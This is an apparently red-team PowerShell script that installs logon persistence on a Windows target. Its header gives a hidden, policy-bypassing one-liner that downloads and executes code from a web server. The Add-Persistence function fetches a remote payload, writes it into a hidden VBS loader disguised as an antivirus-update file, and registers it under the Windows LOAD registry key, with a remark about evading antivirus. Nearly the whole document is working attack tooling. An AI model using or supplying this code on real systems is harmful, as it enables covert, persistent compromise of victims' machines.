# powershell-persistence.ps1
# Author: @curi0usJack
#
# Assumes your target has the ability to download files
#
# 1) Use Unicorn to generate your encoded powershell command. This command will be used for persistence when the user logs in.
# 2) Save to a text file somewhere you can download it.
# 3) Call this from your shell:
#	powershell.exe -window hidden -exec bypass -noni -c "IEX (New-Object Net.WebClient).DownloadString('http://WEBSERVER/powershell-persist.ps1'); Add-Persistence http://WEBSERVER/powershell_attack.txt"
# 
# Kudos to @slobtresix for the initial model. Modified to work directly with unicorn payloads.
#
#
function Add-Persistence()
{
	param
	(
		[parameter(Mandatory=$true)]
		[string]
		$payloadurl
	)
	
	# Default saving the payload to the %TEMP% directory
	$tmpdir = $env:APPDATA
	
	# Change this if desired.
	$payloadvbsloaderpath = "$tmpdir\update-avdefs.vbs"

	# Determine if user is admin. Not required, but nice to know.
	$admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
	if ($admin -eq $true)
		{ Write-Host "[+] User is a local administrator!" }
	else
		{ Write-Host "[-] User is not a local administrator." }

	# Download and verify the payload.
	Write-Host "[+] Downloading payload $payloadurl"
	$payload = (New-Object Net.WebClient).DownloadString($payloadurl)
	
	$payloadlength = $payload.Length
	if ($payloadlength -gt 0) 
		{ Write-Host "[+] Payload length: $payloadlength bytes" }
	else
	{ 
		Write-Host "[!] Payload length: 0 characters. Is the web server up?"
		return
	}
	
	# Create the VBS file and insert the powershell command from unicorn.
	Write-Host "[+] Creating VBS loader."
	$vbs = "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
	$vbs += "ps = ""$payload""`r`n"
	$vbs += "oShell.run(ps),0,true"
	$vbs | Out-File $payloadvbsloaderpath -Force
	
	# Mark the file as hidden.
	Write-Host "[+] Marking $payloadvbsloaderpath as Hidden."
	$fileObj = get-item $payloadvbsloaderpath -Force
	$fileObj.Attributes="Hidden"
	
	# Set the LOAD key. Haven't been caught by AV yet. ;-)
	Write-Host "[+] Updating registry with a LOAD key"
	Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $payloadvbsloaderpath

	Write-Host "[+] Done!"
}

function Remove-Persistence()
{
	$appdir = $env:APPDATA
	$payload = "$appdir\update-avdefs.vbs"
	
	if (Test-Path $payload)
	{
		Remove-Item -Path $payload -Force
		Write-Host "[+] Found and removed $payload."
	}
	else 
		{ Write-Host "[-] $payload not found." }
		
	$reg = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
	if ($reg.LOAD -eq $payload)
	{
		Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD
		Write-Host "[+] Found and removed LOAD registry key."
	}
	else
		{ Write-Host "[-] LOAD registry key not found." }
	
	Write-Host "[+] Done."
}
